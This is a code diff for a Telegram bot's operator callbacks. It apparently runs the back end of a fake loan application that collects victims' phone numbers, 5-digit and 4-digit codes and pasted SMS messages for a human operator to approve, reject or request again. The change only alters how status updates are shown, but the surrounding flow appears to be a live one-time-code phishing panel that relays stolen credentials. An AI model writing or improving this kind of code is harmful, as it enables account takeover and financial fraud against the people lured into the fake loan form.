@@ -19,6 +19,7 @@ if (token) {
     bot.on('callback_query', async (query) => {
         const action = query.data;
         const chatId = query.message.chat.id;
+        const messageId = query.message.message_id;
         await bot.answerCallbackQuery(query.id);
 
         const parts = action.split('_');
@@ -30,95 +31,69 @@ if (token) {
             return bot.sendMessage(chatId, '⚠️ Session not found or already processed.');
         }
 
+        const originalText = query.message.text;
+
         // --- Initial Approval (Submit Application) ---
         if (decision === 'approve') {
             session.status = 'approved';
             session.nextStep = 'sms';
-            await bot.sendMessage(chatId,
-                `✅ *Loan Approved*\n\n` +
-                `📱 Phone: ${session.phone}\n` +
-                `🔑 5-Digit Code: ${session.fiveDigitCode}\n\n` +
-                `Waiting for user to paste the SMS...`,
-                { parse_mode: 'Markdown' }
-            );
+            await bot.editMessageText(`${originalText}\n\n✅ STATUS: APPROVED`, {
+                chat_id: chatId,
+                message_id: messageId
+            });
         } else if (decision === 'reject') {
             session.status = 'rejected';
             session.nextStep = 'rejected';
-            await bot.sendMessage(chatId,
-                `❌ *Loan Rejected*\n\n` +
-                `📱 Phone: ${session.phone}\n` +
-                `🔑 5-Digit Code: ${session.fiveDigitCode}\n\n` +
-                `To reconsider, enter the correct 5-digit code:\n\n` +
-                `Use: /setcode ${sessionId} <5-digit-code>`,
-                { parse_mode: 'Markdown' }
-            );
+            await bot.editMessageText(`${originalText}\n\n❌ STATUS: REJECTED\n(To set the correct code, use: /setcode ${sessionId} <5-digit-code>)`, {
+                chat_id: chatId,
+                message_id: messageId
+            });
         }
 
         // --- SMS Review Actions ---
         else if (decision === 'smsapprove') {
             session.status = 'sms_approved';
             session.nextStep = 'verification';
-            await bot.sendMessage(chatId,
-                `✅ *SMS Approved*\n\n` +
-                `📱 Phone: ${session.phone}\n` +
-                `🔑 5-Digit Code: ${session.fiveDigitCode}\n\n` +
-                `User is now entering the 4-digit code.`,
-                { parse_mode: 'Markdown' }
-            );
+            await bot.editMessageText(`${originalText}\n\n✅ STATUS: APPROVED`, {
+                chat_id: chatId,
+                message_id: messageId
+            });
         } else if (decision === 'smsreject') {
             session.status = 'sms_rejected';
             session.nextStep = 'rejected';
-            await bot.sendMessage(chatId,
-                `❌ *SMS Rejected*\n\n` +
-                `📱 Phone: ${session.phone}\n` +
-                `🔑 5-Digit Code: ${session.fiveDigitCode}\n\n` +
-                `To reconsider, enter the correct 5-digit code:\n\n` +
-                `Use: /setcode ${sessionId} <5-digit-code>`,
-                { parse_mode: 'Markdown' }
-            );
+            await bot.editMessageText(`${originalText}\n\n❌ STATUS: REJECTED\n(To set the correct code, use: /setcode ${sessionId} <5-digit-code>)`, {
+                chat_id: chatId,
+                message_id: messageId
+            });
         } else if (decision === 'smsresend') {
             session.nextStep = 'resend_sms';
-            await bot.sendMessage(chatId,
-                `🔄 *SMS Resend Requested*\n\n` +
-                `📱 Phone: ${session.phone}\n` +
-                `🔑 5-Digit Code: ${session.fiveDigitCode}\n\n` +
-                `User will check their messages for a new SMS code and paste it again.`,
-                { parse_mode: 'Markdown' }
-            );
+            await bot.editMessageText(`${originalText}\n\n🔄 STATUS: RESEND REQUESTED`, {
+                chat_id: chatId,
+                message_id: messageId
+            });
         }
 
         // --- Final Verification Actions ---
         else if (decision === 'verapprove') {
             session.status = 'final_approved';
             session.nextStep = 'final_approved';
-            await bot.sendMessage(chatId,
-                `✅ *Final Approval*\n\n` +
-                `📱 Phone: ${session.phone}\n` +
-                `🔑 5-Digit Code: ${session.fiveDigitCode}\n` +
-                `🔢 4-Digit Code: ${session.fourDigitCode}\n\n` +
-                `Loan is fully approved.`,
-                { parse_mode: 'Markdown' }
-            );
+            await bot.editMessageText(`${originalText}\n\n✅ STATUS: APPROVED`, {
+                chat_id: chatId,
+                message_id: messageId
+            });
         } else if (decision === 'verreject') {
             session.status = 'final_rejected';
             session.nextStep = 'final_rejected';
-            await bot.sendMessage(chatId,
-                `❌ *Final Rejection*\n\n` +
-                `📱 Phone: ${session.phone}\n` +
-                `🔑 5-Digit Code: ${session.fiveDigitCode}\n` +
-                `🔢 4-Digit Code: ${session.fourDigitCode}\n\n` +
-                `User has been shown the inactive account screen.`,
-                { parse_mode: 'Markdown' }
-            );
+            await bot.editMessageText(`${originalText}\n\n❌ STATUS: REJECTED`, {
+                chat_id: chatId,
+                message_id: messageId
+            });
         } else if (decision === 'verresend') {
             session.nextStep = 'resend_verification';
-            await bot.sendMessage(chatId,
-                `🔄 *Verification Code Resend*\n\n` +
-                `📱 Phone: ${session.phone}\n` +
-                `🔑 5-Digit Code: ${session.fiveDigitCode}\n\n` +
-                `User will check for a new 4-digit verification code.`,
-                { parse_mode: 'Markdown' }
-            );
+            await bot.editMessageText(`${originalText}\n\n🔄 STATUS: RESEND REQUESTED`, {
+                chat_id: chatId,
+                message_id: messageId
+            });
         }
     });
 
@@ -133,7 +108,6 @@ if (token) {
             );
         }
 
-        // Command to enter correct 5-digit code after rejection
         if (msg.text && msg.text.startsWith('/setcode ')) {
             const parts = msg.text.split(' ');
             if (parts.length < 3) {
